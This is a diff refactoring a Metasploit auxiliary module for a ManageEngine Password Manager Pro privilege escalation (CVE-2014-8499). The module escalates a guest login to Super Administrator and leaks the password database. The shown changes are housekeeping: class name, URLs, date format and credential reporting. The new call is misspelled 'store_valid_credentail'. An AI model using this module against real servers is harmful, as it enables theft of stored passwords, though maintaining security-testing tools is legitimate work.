@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
@@ -34,10 +31,10 @@ class Metasploit3 < Msf::Auxiliary
         [
           [ 'CVE', '2014-8499' ],
           [ 'OSVDB', '114485' ],
-          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Nov/18' ],
+          [ 'URL', 'https://seclists.org/fulldisclosure/2014/Nov/18' ],
           [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_pmp_privesc.txt' ],
         ],
-      'DisclosureDate' => 'Nov 8 2014'))
+      'DisclosureDate' => '2014-11-08'))
 
     register_options(
       [
@@ -46,7 +43,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('USERNAME', [true, 'The username to login as', 'guest']),
         OptString.new('PASSWORD', [true, 'Password for the specified username', 'guest']),
         OptString.new('TARGETURI', [ true,  "Password Manager Pro application URI", '/'])
-      ], self.class)
+      ])
   end
 
 
@@ -242,41 +239,14 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     print_status("Reporting Super Administrator credentials...")
-    report_super_admin_creds(username, password)
+    store_valid_credentail(user: username, private: password)
 
     print_status("Leaking Password database...")
     loot_passwords(cookie_su)
   end
 
-  def report_super_admin_creds(username, password)
-    status = Metasploit::Model::Login::Status::SUCCESSFUL
-
-    service_data = {
-        address: rhost,
-        port: rport,
-        service_name: 'https',
-        protocol: 'tcp',
-        workspace_id: myworkspace_id
-    }
-
-    credential_data = {
-        origin_type: :service,
-        module_fullname: self.fullname,
-        private_type: :password,
-        private_data: username,
-        username: password
-    }
-
-    credential_data.merge!(service_data)
-    credential_core = create_credential(credential_data)
-    login_data = {
-        core: credential_core,
-        access_level: 'Super Administrator',
-        status: status,
-        last_attempted_at: DateTime.now
-    }
-    login_data.merge!(service_data)
-    create_credential_login(login_data)
+  def service_details
+    super.merge({access_level: 'Super Administrator'})
   end
 
   def loot_passwords(cookie_admin)
